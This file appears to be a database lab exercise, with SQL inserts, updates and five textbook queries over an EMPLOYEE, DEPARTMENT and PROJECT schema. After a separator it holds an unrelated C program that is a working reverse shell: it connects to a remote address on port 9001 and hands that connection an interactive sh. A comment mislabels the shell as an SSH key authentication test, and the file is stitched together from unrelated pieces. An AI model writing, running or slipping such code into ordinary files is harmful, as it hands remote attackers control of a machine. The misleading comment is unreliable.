INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSACC01','ADITI','PANDEY','KOLAR','F',250000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSACC02','ANJUM','CHOPRA','VIJAYAPUR','F',740000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSISE01','VIRAT','KOHLI','BANGLORE','M',150000);
INSERT INTO EMPLOYEE(SSN,FNAME,LNAME,ADDRESS,SEX,SALARY)VALUES('RNSIT01','MUKESH','ARYA','MANGLORE','M',480000);


INSERT INTO DEPARTMENT VALUES('1','ACCOUNTS','2002-01-01','RNSECE01');
INSERT INTO DEPARTMENT VALUES('2','IT','2012-06-04','RNSACC01');
INSERT INTO DEPARTMENT VALUES('3','ECE','2006-11-08','RNSIT01');
INSERT INTO DEPARTMENT VALUES('4','ISE','2008-01-21','RNSISE01');
INSERT INTO DEPARTMENT VALUES('5','CSE','2012-03-07','RNSCSE05');


UPDATE EMPLOYEE 
SET SUPERSSN=NULL,DNO='3'
WHERE SSN='RNSECE01';

UPDATE EMPLOYEE 
SET SUPERSSN='RNSCSE02',DNO='5'
WHERE SSN='RNSCSE01';

UPDATE EMPLOYEE 
SET SUPERSSN='RNSCSE03',DNO='5'
WHERE SSN='RNSCSE02';

UPDATE EMPLOYEE 
SET SUPERSSN='RNSCSE04',DNO='5'
WHERE SSN='RNSCSE03';

UPDATE EMPLOYEE 
SET SUPERSSN='RNSCSE05',DNO='5'
WHERE SSN='RNSCSE04';

UPDATE EMPLOYEE 
SET SUPERSSN='RNSCSE06',DNO='5'
WHERE SSN='RNSCSE05';

UPDATE EMPLOYEE 
SET SUPERSSN=NULL,DNO='5'
WHERE SSN='RNSCSE06';

UPDATE EMPLOYEE 
SET SUPERSSN='RNSACC02',DNO='1'
WHERE SSN='RNSACC01';

UPDATE EMPLOYEE 
SET SUPERSSN=NULL,DNO='1'
WHERE SSN='RNSACC02';

UPDATE EMPLOYEE 
SET SUPERSSN=NULL,DNO='2'
WHERE SSN='RNSISE01';

UPDATE EMPLOYEE 
SET SUPERSSN=NULL,DNO='4'
WHERE SSN='RNSIT01';


INSERT INTO DLOCATION VALUES('1','BANGLORE');
INSERT INTO DLOCATION VALUES('2','BANGLORE');
INSERT INTO DLOCATION VALUES('3','BANGLORE');
INSERT INTO DLOCATION VALUES('4','MANGLORE');
INSERT INTO DLOCATION VALUES('5','MANGLORE');

INSERT INTO PROJECT VALUES(100,'IOT','BANGLORE','5');
INSERT INTO PROJECT VALUES(101,'META','BANGLORE','5');
INSERT INTO PROJECT VALUES(102,'FULLSTACK','BANGLORE','5');
INSERT INTO PROJECT VALUES(103,'ECOMMERCE','BANGLORE','4');
INSERT INTO PROJECT VALUES(104,'SALES MANAGEMENT','BANGLORE','1');
INSERT INTO PROJECT VALUES(105,'DIGITAL MARKETING','BANGLORE','1');
INSERT INTO PROJECT VALUES(106,'SENSOR','BANGLORE','3');
INSERT INTO PROJECT VALUES(108,'BIGDATA','BANGLORE','2');

INSERT INTO WORKSON VALUES('RNSCSE01',100,5);
INSERT INTO WORKSON VALUES('RNSCSE01',101,5);
INSERT INTO WORKSON VALUES('RNSCSE01',102,5);
INSERT INTO WORKSON VALUES('RNSCSE02',100,8);
INSERT INTO WORKSON VALUES('RNSCSE03',102,8);
INSERT INTO WORKSON VALUES('RNSCSE04',100,7);
INSERT INTO WORKSON VALUES('RNSCSE05',101,4);
INSERT INTO WORKSON VALUES('RNSCSE06',102,4);
INSERT INTO WORKSON VALUES('RNSACC01',104,6);
INSERT INTO WORKSON VALUES('RNSACC02',105,9);
INSERT INTO WORKSON VALUES('RNSISE01',106,10);
INSERT INTO WORKSON VALUES('RNSIT01',107,5);
INSERT INTO WORKSON VALUES('RNSECE01',103,5);


QUERRIES;

1.Make a list of all project numbers for projects that involve an employee whose last 
name is ‘Scott’, either as a worker or as a manager of the department that controls the 
projecT


(SELECT DISTINCT P.PNO
FROM EMPLOYEE E ,PROJECT P,DEPARTMENT D
WHERE E.DNO=D.DNO AND 
D.MGRSSN=E.SSN AND
E.LNAME='SCOTT')
UNION
(SELECT DISTINCT P1.PNO
FROM EMPLOYEE E1,WORKSON W,PROJECT P1
WHERE E1.SSN=W.ESSN AND
P1.PNO=W.PNO AND
E1.LNAME='SCOTT');

2.Show the resulting salaries if every employee working on the ‘IoT’ project is given a 10 
percent raise

SELECT E.FNAME,E.LNAME ,1.1*E.SALARY AS INCRSALARY
FROM EMPLOYEE E,WORKSON W,PROJECT P
WHERE E.SSN=W.ESSN AND
P.PNO=W.PNO AND
P.PNAME='IOT';

3.Find the sum of the salaries of all employees of the ‘Accounts’ department, as well as 
the maximum salary, the minimum salary, and the average salary in this department


SELECT SUM(E.SALARY),MAX(E.SALARY),MIN(E.SALARY),AVG(E.SALARY)
FROM EMPLOYEE E, DEPARTMENT D
WHERE E.DNO=D.DNO AND
D.DNAME='ACCOUNTS';

4. Retrieve the name of each employee who works on all the projects Controlled by 
department number 5 (use NOT EXISTS operator)

SELECT E.FNAME,E.LNAME 
FROM EMPLOYEE E
WHERE NOT EXISTS((SELECT PNO 
FROM PROJECT 
WHERE DNO='5')
EXCEPT(SELECT PNO
FROM WORKSON W
WHERE E.SSN=W.ESSN));


5.5. For each department that has more than five employees, retrieve the department 
number and the number of its employees who are making more than Rs. 6, 00,000.

SELECT D.DNO ,COUNT(*)
FROM EMPLOYEE E,DEPARTMENT D
WHERE E.DNO=D.DNO AND
E.SALARY>600000 AND
D.DNO IN(SELECT E1.DNO 
FROM EMPLOYEE E1
GROUP BY E1.DNO
HAVING COUNT(*)>5)
GROUP BY D.DNO;




------------

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.00.00.00");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}


// Test for VM ssh key authentication.
